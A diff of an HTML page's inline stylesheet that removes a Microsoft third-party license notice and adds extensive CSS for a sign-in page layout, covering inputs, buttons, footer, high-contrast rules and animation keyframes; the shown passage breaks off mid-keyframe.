@@ -22,63 +22,2743 @@
 </noscript>
 <meta name=robots content=none>
 <style>
-    /*! Copyright (C) Microsoft Corporation. All rights reserved. */
-    /*!
-    ------------------------------------------- START OF THIRD PARTY NOTICE -----------------------------------------
-    
-    This file is based on or incorporates material from the projects listed below (Third Party IP). The original copyright notice and the license under which Microsoft received such Third Party IP, are set forth below. Such licenses and notices are provided for informational purposes only. Microsoft licenses the Third Party IP to you under the licensing terms for the Microsoft product. Microsoft reserves all other rights not expressly granted under this agreement, whether by implication, estoppel or otherwise.
-    
-    //-----------------------------------------------------------------------------
-    twbs-bootstrap-sass (3.3.0)
-    //-----------------------------------------------------------------------------
-    
-    The MIT License (MIT)
-    
-    Copyright (c) 2013 Twitter, Inc
-    
-    Permission is hereby granted, free of charge, to any person obtaining a copy
-    of this software and associated documentation files (the "Software"), to deal
-    in the Software without restriction, including without limitation the rights
-    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-    copies of the Software, and to permit persons to whom the Software is
-    furnished to do so, subject to the following conditions:
-    
-    The above copyright notice and this permission notice shall be included in
-    all copies or substantial portions of the Software.
-    
-    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
-    THE SOFTWARE.
-    
-    //-----------------------------------------------------------------------------
-    necolas-normalize.css (3.0.2)
-    //-----------------------------------------------------------------------------
-    ! normalize.css v3.0.2 | MIT License | git.io/normalize
-    
-    Copyright (c) Nicolas Gallagher and Jonathan Neal
-    
-    Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
-    
-    The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
-    
-    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-    
-    Provided for Informational Purposes Only
-    MIT License
-    Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the Software), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
-    The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
-    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
-    MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
-    NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
-    LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
-    OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
-    WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-    */
-    /*! normalize.css v3.0.2 | MIT License | git.io/normalize */
+    html {
+        font-family: sans-serif;
+        -ms-text-size-adjust: 100%;
+        -webkit-text-size-adjust: 100%
+    }
+
+    body {
+        margin: 0
+    }
+
+    a {
+        background-color: transparent
+    }
+
+    a:active,
+    a:hover {
+        outline: 0
+    }
+
+    img {
+        border: 0
+    }
+
+    input {
+        color: inherit;
+        font: inherit;
+        margin: 0
+    }
+
+    input[type="submit"] {
+        -webkit-appearance: button;
+        cursor: pointer
+    }
+
+    button::-moz-focus-inner,
+    input::-moz-focus-inner {
+        border: 0;
+        padding: 0
+    }
+
+    input[type="checkbox"] {
+        box-sizing: border-box;
+        padding: 0
+    }
+
+    * {
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        box-sizing: border-box
+    }
+
+    *:before,
+    *:after {
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        box-sizing: border-box
+    }
+
+    input {
+        font-family: inherit;
+        font-size: inherit
+    }
+
+    a:focus {
+        outline: thin dotted;
+        outline-offset: -2px;
+        outline: 5px auto -webkit-focus-ring-color
+    }
+
+    img {
+        vertical-align: middle
+    }
+
+    html {
+        font-size: 100%
+    }
+
+    body {
+        font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        font-weight: 400;
+        font-size: .9375rem;
+        line-height: 1.25rem;
+        padding-bottom: .227px;
+        padding-top: .227px;
+        background-color: #fff
+    }
+
+    a {
+        color: #ccc;
+        text-decoration: none
+    }
+
+    a:link {
+        color: #0067b8
+    }
+
+    a:visited {
+        color: #0067b8
+    }
+
+    a:hover {
+        color: #666
+    }
+
+    a:focus {
+        color: #0067b8
+    }
+
+    a:active {
+        color: #999
+    }
+
+    @font-face {
+        font-family: "Segoe UI Webfont";
+        src: local("Segoe UI");
+        font-weight: 400;
+        font-style: normal
+    }
+
+    @font-face {
+        font-family: "Segoe UI Webfont";
+        src: local("Segoe UI Semibold");
+        font-weight: 600;
+        font-style: normal
+    }
+
+    .text-title {
+        line-height: 1.75rem;
+        padding-bottom: 2.3632px;
+        padding-top: 2.3632px
+    }
+
+    .text-body {
+        font-weight: 400;
+        font-size: .9375rem;
+        line-height: 1.25rem;
+        padding-bottom: .227px;
+        padding-top: .227px
+    }
+
+    .row:before,
+    .row:after {
+        content: " ";
+        display: table
+    }
+
+    .row:after {
+        clear: both
+    }
+
+    .col-xs-24,
+    .col-md-24 {
+        position: relative;
+        min-height: 1px;
+        padding-left: 2px;
+        padding-right: 2px
+    }
+
+    .col-xs-24 {
+        float: left
+    }
+
+    .col-xs-24 {
+        width: 100%
+    }
+
+    @media (min-width:768px) {
+        .col-md-24 {
+            float: left
+        }
+
+        .col-md-24 {
+            width: 100%
+        }
+    }
+
+    label {
+        display: inline-block;
+        max-width: 100%
+    }
+
+    input[type="file"]:focus,
+    input[type="radio"]:focus,
+    input[type="checkbox"]:focus {
+        outline: thin dotted;
+        outline-offset: -2px;
+        outline: 5px auto -webkit-focus-ring-color
+    }
+
+    .form-control {
+        display: block;
+        width: 100%;
+        background-image: none
+    }
+
+    .checkbox {
+        position: relative;
+        display: block
+    }
+
+    .checkbox label {
+        min-height: 20px;
+        cursor: pointer
+    }
+
+    input {
+        max-width: 100%;
+        line-height: inherit
+    }
+
+    input[type="tel"] {
+        border-style: solid
+    }
+
+    .text-input-focus,
+    input[type="color"]:focus,
+    input[type="date"]:focus,
+    input[type="datetime"]:focus,
+    input[type="datetime-local"]:focus,
+    input[type="email"]:focus,
+    input[type="month"]:focus,
+    input[type="number"]:focus,
+    input[type="password"]:focus,
+    input[type="search"]:focus,
+    input[type="tel"]:focus,
+    input[type="text"]:focus,
+    input[type="time"]:focus,
+    input[type="url"]:focus,
+    input[type="week"]:focus,
+    textarea:focus {
+        border-color: #0067b8;
+        background-color: #fff
+    }
+
+    .text-input-moz-placeholder,
+    input[type="color"]::-moz-placeholder,
+    input[type="date"]::-moz-placeholder,
+    input[type="datetime"]::-moz-placeholder,
+    input[type="datetime-local"]::-moz-placeholder,
+    input[type="email"]::-moz-placeholder,
+    input[type="month"]::-moz-placeholder,
+    input[type="number"]::-moz-placeholder,
+    input[type="password"]::-moz-placeholder,
+    input[type="search"]::-moz-placeholder,
+    input[type="tel"]::-moz-placeholder,
+    input[type="text"]::-moz-placeholder,
+    input[type="time"]::-moz-placeholder,
+    input[type="url"]::-moz-placeholder,
+    input[type="week"]::-moz-placeholder,
+    textarea::-moz-placeholder {
+        color: rgba(0, 0, 0, 0.6);
+        opacity: 1
+    }
+
+    .text-input-webkit-placeholder,
+    input[type="color"]::-webkit-input-placeholder,
+    input[type="date"]::-webkit-input-placeholder,
+    input[type="datetime"]::-webkit-input-placeholder,
+    input[type="datetime-local"]::-webkit-input-placeholder,
+    input[type="email"]::-webkit-input-placeholder,
+    input[type="month"]::-webkit-input-placeholder,
+    input[type="number"]::-webkit-input-placeholder,
+    input[type="password"]::-webkit-input-placeholder,
+    input[type="search"]::-webkit-input-placeholder,
+    input[type="tel"]::-webkit-input-placeholder,
+    input[type="text"]::-webkit-input-placeholder,
+    input[type="time"]::-webkit-input-placeholder,
+    input[type="url"]::-webkit-input-placeholder,
+    input[type="week"]::-webkit-input-placeholder,
+    textarea::-webkit-input-placeholder {
+        color: rgba(0, 0, 0, 0.6)
+    }
+
+    input[type="checkbox"] {
+        width: 20px;
+        height: 20px
+    }
+
+    .checkbox label {
+        padding-left: 28px
+    }
+
+    .checkbox input[type="checkbox"] {
+        position: absolute;
+        margin-left: -28px
+    }
+
+    input[type="submit"] {
+        padding: 4px 12px 4px 12px;
+        position: relative;
+        max-width: 100%;
+        text-align: center;
+        white-space: nowrap;
+        overflow: hidden;
+        vertical-align: middle;
+        text-overflow: ellipsis;
+        touch-action: manipulation;
+        border-style: solid;
+        border-width: 2px
+    }
+
+    .btn:hover,
+    .btn:focus,
+    button:hover,
+    button:focus,
+    input[type="button"]:hover,
+    input[type="button"]:focus,
+    input[type="submit"]:hover,
+    input[type="submit"]:focus,
+    input[type="reset"]:hover,
+    input[type="reset"]:focus {
+        border-color: rgba(0, 0, 0, 0.4)
+    }
+
+    .btn:hover,
+    button:hover,
+    input[type="button"]:hover,
+    input[type="submit"]:hover,
+    input[type="reset"]:hover {
+        cursor: pointer
+    }
+
+    .btn:active,
+    button:active,
+    input[type="button"]:active,
+    input[type="submit"]:active,
+    input[type="reset"]:active {
+        background-color: rgba(0, 0, 0, 0.4);
+        border-color: transparent
+    }
+
+    @-ms-viewport {
+        width: device-width
+    }
+
+    a:focus {
+        outline-offset: 0
+    }
+
+    input[type="file"]:focus,
+    input[type="radio"]:focus,
+    input[type="checkbox"]:focus {
+        outline-offset: 0
+    }
+
+    body {
+        direction: ltr
+    }
+
+    .text-secondary {
+        color: rgba(0, 0, 0, 0.7);
+        font-size: 13px
+    }
+
+    body.cb .text-13 {
+        font-size: .8125rem
+    }
+
+    body.cb div.placeholderContainer {
+        width: 100%;
+        position: relative
+    }
+
+    .no-margin-top {
+        margin-top: 0
+    }
+
+    .no-padding-left-right {
+        padding-left: 0;
+        padding-right: 0
+    }
+
+    @keyframes pulse {
+        from {
+            opacity: .4
+        }
+    }
+
+    @-o-keyframes pulse {
+        from {
+            opacity: .4
+        }
+    }
+
+    @-moz-keyframes pulse {
+        from {
+            opacity: .4
+        }
+    }
+
+    @-webkit-keyframes pulse {
+        from {
+            opacity: .4
+        }
+    }
+
+    @-webkit-keyframes progressDot {
+
+        0%,
+        20% {
+            left: 0;
+            -webkit-animation-timing-function: ease-out;
+            opacity: 0
+        }
+
+        25% {
+            opacity: 1
+        }
+
+        35% {
+            left: 45%;
+            -webkit-animation-timing-function: linear
+        }
+
+        65% {
+            left: 60%;
+            -webkit-animation-timing-function: ease-in
+        }
+
+        75% {
+            opacity: 1
+        }
+
+        80%,
+        100% {
+            left: 100%;
+            opacity: 0
+        }
+    }
+
+    @-moz-keyframes progressDot {
+
+        0%,
+        20% {
+            left: 0;
+            -moz-animation-timing-function: ease-out;
+            opacity: 0
+        }
+
+        25% {
+            opacity: 1
+        }
+
+        35% {
+            left: 45%;
+            -moz-animation-timing-function: linear
+        }
+
+        65% {
+            left: 60%;
+            -moz-animation-timing-function: ease-in
+        }
+
+        75% {
+            opacity: 1
+        }
+
+        80%,
+        100% {
+            left: 100%;
+            opacity: 0
+        }
+    }
+
+    @-o-keyframes progressDot {
+
+        0%,
+        20% {
+            left: 0;
+            -o-animation-timing-function: ease-out;
+            opacity: 0
+        }
+
+        25% {
+            opacity: 1
+        }
+
+        35% {
+            left: 45%;
+            -o-animation-timing-function: linear
+        }
+
+        65% {
+            left: 60%;
+            -o-animation-timing-function: ease-in
+        }
+
+        75% {
+            opacity: 1
+        }
+
+        80%,
+        100% {
+            left: 100%;
+            opacity: 0
+        }
+    }
+
+    @keyframes progressDot {
+
+        0%,
+        20% {
+            left: 0;
+            animation-timing-function: ease-out;
+            opacity: 0
+        }
+
+        25% {
+            opacity: 1
+        }
+
+        35% {
+            left: 45%;
+            animation-timing-function: linear
+        }
+
+        65% {
+            left: 60%;
+            animation-timing-function: ease-in
+        }
+
+        75% {
+            opacity: 1
+        }
+
+        80%,
+        100% {
+            left: 100%;
+            opacity: 0
+        }
+    }
+
+    @keyframes fadeIn {
+        from {
+            opacity: 0
+        }
+
+        to {
+            opacity: 1
+        }
+    }
+
+    @-o-keyframes fadeIn {
+        from {
+            opacity: 0
+        }
+
+        to {
+            opacity: 1
+        }
+    }
+
+    @-moz-keyframes fadeIn {
+        from {
+            opacity: 0
+        }
+
+        to {
+            opacity: 1
+        }
+    }
+
+    @-webkit-keyframes fadeIn {
+        from {
+            opacity: 0
+        }
+
+        to {
+            opacity: 1
+        }
+    }
+
+    body.cb {
+        color: #1b1b1b;
+        text-align: left
+    }
+
+    .background-logo {
+        max-width: 256px;
+        max-height: 36px;
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+        -webkit-animation: fadeIn 1s;
+        -moz-animation: fadeIn 1s;
+        -o-animation: fadeIn 1s;
+        animation: fadeIn 1s
+    }
+
+    .background-logo-holder {
+        height: 36px;
+        margin-bottom: 24px
+    }
+
+    .background-image-holder {
+        position: fixed;
+        top: 0;
+        width: 100%;
+        height: 100%
+    }
+
+    .footer {
+        position: absolute;
+        left: 0;
+        bottom: 0;
+        width: 100%;
+        overflow: visible;
+        z-index: 99;
+        clear: both;
+        min-height: 28px
+    }
+
+    .footer.has-background.background-always-visible {
+        background-color: rgba(0, 0, 0, 0.6)
+    }
+
+    div.footerNode {
+        margin: 0;
+        float: right
+    }
+
+    .footer-content.footer-item {
+        font-size: 12px;
+        line-height: 28px;
+        white-space: nowrap;
+        display: inline-block;
+        margin-left: 8px;
+        margin-right: 8px
+    }
+
+    .footer-content.footer-item.debug-item {
+        text-decoration: none;
+        letter-spacing: 3px;
+        line-height: 22px;
+        vertical-align: top;
+        font-size: 16px;
+        font-weight: 600
+    }
+
+    .footer-content.footer-item.has-background.background-always-visible,
+    .footer-content.footer-item.debug-item.has-background.background-always-visible {
+        color: #fff
+    }
+
+    .outer {
+        display: table;
+        position: absolute;
+        height: 100%;
+        width: 100%
+    }
+
+    .middle {
+        display: table-cell;
+        vertical-align: middle
+    }
+
+    .sign-in-box {
+        margin-left: auto;
+        margin-right: auto;
+        position: relative;
+        max-width: 440px;
+        width: calc(100% - 40px);
+        padding: 44px;
+        margin-bottom: 28px;
+        background-color: #fff;
+        -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        min-width: 320px;
+        min-height: 338px;
+        overflow: hidden
+    }
+
+    a:hover {
+        text-decoration: underline
+    }
+
+    .template-section {
+        display: table-row
+    }
+
+    .template-section.main-section {
+        height: 100%
+    }
+
+    input[type="tel"] {
+        padding: 6px 10px;
+        border-width: 1px;
+        border-color: rgba(0, 0, 0, 0.6);
+        height: 36px;
+        outline: none;
+        border-radius: 0;
+        -webkit-border-radius: 0;
+        background-color: transparent
+    }
+
+    .text-input-hover,
+    input[type="color"]:hover,
+    input[type="date"]:hover,
+    input[type="datetime"]:hover,
+    input[type="datetime-local"]:hover,
+    input[type="email"]:hover,
+    input[type="month"]:hover,
+    input[type="number"]:hover,
+    input[type="password"]:hover,
+    input[type="search"]:hover,
+    input[type="tel"]:hover,
+    input[type="text"]:hover,
+    input[type="time"]:hover,
+    input[type="url"]:hover,
+    input[type="week"]:hover,
+    textarea:hover,
+    select:hover {
+        border-color: #323232;
+        border-color: rgba(0, 0, 0, 0.8)
+    }
+
+    .text-input-focus,
+    input[type="color"]:focus,
+    input[type="date"]:focus,
+    input[type="datetime"]:focus,
+    input[type="datetime-local"]:focus,
+    input[type="email"]:focus,
+    input[type="month"]:focus,
+    input[type="number"]:focus,
+    input[type="password"]:focus,
+    input[type="search"]:focus,
+    input[type="tel"]:focus,
+    input[type="text"]:focus,
+    input[type="time"]:focus,
+    input[type="url"]:focus,
+    input[type="week"]:focus,
+    textarea:focus,
+    select:focus {
+        border-color: #0067b8;
+        background-color: transparent
+    }
+
+    input[type="submit"] {
+        min-height: 32px;
+        border: none;
+        min-width: 108px;
+        line-height: normal
+    }
+
+    .btn-hover,
+    .btn:hover,
+    button:hover,
+    input[type="button"]:hover,
+    input[type="submit"]:hover,
+    input[type="reset"]:hover {
+        background-color: #b2b2b2;
+        background-color: rgba(0, 0, 0, 0.3)
+    }
+
+    .btn-focus,
+    .btn:focus,
+    button:focus,
+    input[type="button"]:focus,
+    input[type="submit"]:focus,
+    input[type="reset"]:focus {
+        background-color: #b2b2b2;
+        background-color: rgba(0, 0, 0, 0.3);
+        text-decoration: underline;
+        outline: 2px solid #000
+    }
+
+    .btn-active,
+    .btn:active,
+    button:active,
+    input[type="button"]:active,
+    input[type="submit"]:active,
+    input[type="reset"]:active,
+    .btn.btn-primary-active,
+    .btn.btn-primary:active,
+    button.btn-primary:active,
+    input[type="button"].btn-primary:active,
+    input[type="submit"].btn-primary:active,
+    input[type="reset"].btn-primary:active {
+        outline: none;
+        text-decoration: none;
+        -ms-transform: scale(.98);
+        -webkit-transform: scale(.98);
+        transform: scale(.98)
+    }
+
+    .button.primary {
+        color: #fff;
+        border-color: #0067b8;
+        background-color: #0067b8;
+        display: block;
+        width: 100%
+    }
+
+    .button.primary:hover {
+        background-color: #005da6
+    }
+
+    .button.primary:focus {
+        background-color: #005da6;
+        text-decoration: underline;
+        outline: 2px solid #000
+    }
+
+    .button.primary:active {
+        outline: none;
+        text-decoration: none;
+        -ms-transform: scale(.98);
+        -webkit-transform: scale(.98);
+        transform: scale(.98)
+    }
+
+    .logo {
+        max-width: 256px;
+        height: 24px
+    }
+
+    .identityBanner {
+        height: 24px;
+        background: #fff;
+        margin-top: 16px;
+        margin-bottom: -4px
+    }
+
+    .identity {
+        line-height: 24px;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis
+    }
+
+    .row {
+        margin-left: 0;
+        margin-right: 0
+    }
+
+    .tile-img {
+        position: relative
+    }
+
+    .tile-img.small {
+        width: 24px;
+        height: 24px;
+        float: left;
+        margin-right: 8px
+    }
+
+    .text-body {
+        padding: 0;
+        margin-top: 16px;
+        margin-bottom: 12px
+    }
+
+    .form-group {
+        margin-bottom: 16px
+    }
+
+    .form-group label {
+        margin-top: 0;
+        margin-bottom: 0
+    }
+
+    input[type="submit"] {
+        margin-top: 0;
+        margin-bottom: 0
+    }
+
+    .no-margin-bottom {
+        margin-bottom: 0
+    }
+
+    .no-margin-top-bottom {
+        margin-top: 0;
+        margin-bottom: 0
+    }
+
+    .overflow-hidden {
+        overflow: hidden
+    }
+
+    .position-buttons>div:first-child {
+        display: inline-block;
+        width: 100%;
+        margin-bottom: 36px
+    }
+
+    .button-container {
+        position: absolute;
+        bottom: 0;
+        right: 0;
+        text-align: right
+    }
+
+    @media (max-width:600px),
+    (max-height:366px) {
+        .background-image-holder.app {
+            display: inherit
+        }
+
+        .background-logo-holder {
+            margin-top: 24px
+        }
+
+        .middle {
+            vertical-align: top
+        }
+
+        .sign-in-box {
+            padding: 24px;
+            margin-top: 0;
+            margin-bottom: 88px;
+            -webkit-box-shadow: none;
+            -moz-box-shadow: none
+        }
+
+        .sign-in-box.app {
+            min-width: 304px;
+            width: calc(100vw - 16px)
+        }
+
+        .sign-in-box.app {
+            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(0, 0, 0, 0.4)
+        }
+
+        .footer.has-background {
+            background-color: #fff;
+            filter: none
+        }
+
+        div.footerNode {
+            float: left;
+            margin: 0 24px !important
+        }
+
+        .footer-content.footer-item.has-background,
+        .footer-content.footer-item.debug-item.has-background {
+            color: #747474
+        }
+    }
+
+    .inline-block {
+        display: inline-block
+    }
+
+    input[type="tel"] {
+        border-top-width: 0;
+        border-left-width: 0;
+        border-right-width: 0;
+        padding-left: 0
+    }
+
+    .text-title {
+        color: #1b1b1b;
+        font-size: 1.5rem;
+        font-weight: 600;
+        padding: 0;
+        margin-top: 16px;
+        margin-bottom: 12px;
+        font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"
+    }
+
+    .text-title:lang(zh-cn),
+    .text-title:lang(zh-tw),
+    .text-title p:lang(zh-cn),
+    .text-title p:lang(zh-tw) {
+        font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"
+    }
+
+    .pagination-view {
+        position: relative
+    }
+
+    .pagination-view.has-identity-banner {
+        min-height: 170px
+    }
+
+    .lightbox-cover {
+        background-color: white;
+        opacity: 0;
+        z-index: -1;
+        height: 100%;
+        width: 100%;
+        position: absolute;
+        top: 0;
+        left: 0;
+        transition: all .5s ease-in;
+        -o-transition: all .5s ease-in;
+        -moz-transition: all .5s ease-in;
+        -webkit-transition: all .5s ease-in
+    }
+
+    @media (-ms-high-contrast) {
+        input[type="submit"] {
+            -ms-high-contrast-adjust: none
+        }
+
+        .btn:hover,
+        .button:hover,
+        button:hover,
+        input[type="button"]:hover,
+        input[type="submit"]:hover,
+        input[type="reset"]:hover,
+        .btn.btn-google:hover {
+            outline: 1px solid windowText;
+            border: 1px solid highlight;
+            background-color: highlight;
+            color: highlightText;
+            text-decoration: none
+        }
+
+        .btn:hover:focus,
+        .button:hover:focus,
+        button:hover:focus,
+        input[type="button"]:hover:focus,
+        input[type="submit"]:hover:focus,
+        input[type="reset"]:hover:focus,
+        .btn.btn-google:hover:focus {
+            outline: 1px solid windowText;
+            border: 1px solid windowText;
+            background-color: highlight;
+            color: highlightText;
+            text-decoration: underline
+        }
+
+        .btn:focus,
+        .button:focus,
+        button:focus,
+        input[type="button"]:focus,
+        input[type="submit"]:focus,
+        input[type="reset"]:focus,
+        .btn.btn-google:focus {
+            outline: 1px solid windowText;
+            border: 1px solid windowText;
+            background-color: window;
+            color: windowText;
+            text-decoration: underline
+        }
+
+        input[type="submit"].primary {
+            outline: 1px solid highlight;
+            border: 1px solid highlight;
+            background-color: highlight;
+            color: highlightText;
+            text-decoration: none
+        }
+
+        .btn.btn-primary:hover,
+        .button.btn-primary:hover,
+        button.btn-primary:hover,
+        input[type="button"].btn-primary:hover,
+        input[type="submit"].btn-primary:hover,
+        input[type="reset"].btn-primary:hover,
+        .btn.btn-google.btn-primary:hover,
+        .btn.primary:hover,
+        .button.primary:hover,
+        button.primary:hover,
+        input[type="button"].primary:hover,
+        input[type="submit"].primary:hover,
+        input[type="reset"].primary:hover,
+        .btn.btn-google.primary:hover,
+        .btn.secondary:hover,
+        .button.secondary:hover,
+        button.secondary:hover,
+        input[type="button"].secondary:hover,
+        input[type="submit"].secondary:hover,
+        input[type="reset"].secondary:hover,
+        .btn.btn-google.secondary:hover {
+            outline: 1px solid highlight;
+            border: 1px solid window;
+            background-color: window;
+            color: highlight;
+            text-decoration: none
+        }
+
+        .btn.btn-primary:hover:focus,
+        .button.btn-primary:hover:focus,
+        button.btn-primary:hover:focus,
+        input[type="button"].btn-primary:hover:focus,
+        input[type="submit"].btn-primary:hover:focus,
+        input[type="reset"].btn-primary:hover:focus,
+        .btn.btn-google.btn-primary:hover:focus,
+        .btn.primary:hover:focus,
+        .button.primary:hover:focus,
+        button.primary:hover:focus,
+        input[type="button"].primary:hover:focus,
+        input[type="submit"].primary:hover:focus,
+        input[type="reset"].primary:hover:focus,
+        .btn.btn-google.primary:hover:focus,
+        .btn.secondary:hover:focus,
+        .button.secondary:hover:focus,
+        button.secondary:hover:focus,
+        input[type="button"].secondary:hover:focus,
+        input[type="submit"].secondary:hover:focus,
+        input[type="reset"].secondary:hover:focus,
+        .btn.btn-google.secondary:hover:focus {
+            outline: 1px solid windowText;
+            border: 1px solid window;
+            background-color: window;
+            color: highlight;
+            text-decoration: underline
+        }
+
+        .btn.btn-primary:focus,
+        .button.btn-primary:focus,
+        button.btn-primary:focus,
+        input[type="button"].btn-primary:focus,
+        input[type="submit"].btn-primary:focus,
+        input[type="reset"].btn-primary:focus,
+        .btn.btn-google.btn-primary:focus,
+        .btn.primary:focus,
+        .button.primary:focus,
+        button.primary:focus,
+        input[type="button"].primary:focus,
+        input[type="submit"].primary:focus,
+        input[type="reset"].primary:focus,
+        .btn.btn-google.primary:focus,
+        .btn.secondary:focus,
+        .button.secondary:focus,
+        button.secondary:focus,
+        input[type="button"].secondary:focus,
+        input[type="submit"].secondary:focus,
+        input[type="reset"].secondary:focus,
+        .btn.btn-google.secondary:focus {
+            outline: 1px solid windowText;
+            border: 1px solid window;
+            background-color: highlight;
+            color: highlightText;
+            text-decoration: underline
+        }
+    }
+
+    .fade-in-lightbox {
+        animation: fadeIn .3s ease-in;
+        -webkit-animation: fadeIn .3s ease-in;
+        -moz-animation: fadeIn .3s ease-in;
+        -ms-animation: fadeIn .3s ease-in;
+        -o-animation: fadeIn .3s ease-in
+    }
+
+    .animate {
+        animation-duration: .25s;
+        -webkit-animation-duration: .25s;
+        -moz-animation-duration: .25s;
+        -ms-animation-duration: .25s;
+        -o-animation-duration: .25s;
+        animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+        -webkit-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+        -moz-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+        -ms-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+        -o-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
+        animation-fill-mode: both;
+        -webkit-animation-fill-mode: both;
+        -moz-animation-fill-mode: both;
+        -ms-animation-fill-mode: both;
+        -o-animation-fill-mode: both;
+        transition-property: left;
+        -webkit-transition-property: left;
+        -moz-transition-property: left;
+        -ms-transition-property: left;
+        -o-transition-property: left
+    }
+
+    html[dir=ltr] .animate.slide-in-next {
+        animation-name: show-from-right;
+        -webkit-animation-name: show-from-right;
+        -moz-animation-name: show-from-right;
+        -ms-animation-name: show-from-right;
+        -o-animation-name: show-from-right
+    }
+
+    @keyframes hide-to-left {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: -200px;
+            opacity: 0
+        }
+    }
+
+    @keyframes show-from-right {
+        from {
+            left: 200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @keyframes hide-to-right {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: 200px;
+            opacity: 0
+        }
+    }
+
+    @keyframes show-from-left {
+        from {
+            left: -200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-webkit-keyframes hide-to-left {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: -200px;
+            opacity: 0
+        }
+    }
+
+    @-webkit-keyframes show-from-right {
+        from {
+            left: 200px;
+            opacity: 0
+        }
+
+        to {
+            left: 0;
+            opacity: 1
+        }
+    }
+
+    @-webkit-keyframes hide-to-right {
+        from {
+            left: 0;
+            opacity: 1
+        }
+
+        to {
+            left: 200px;
+            opacity: 0
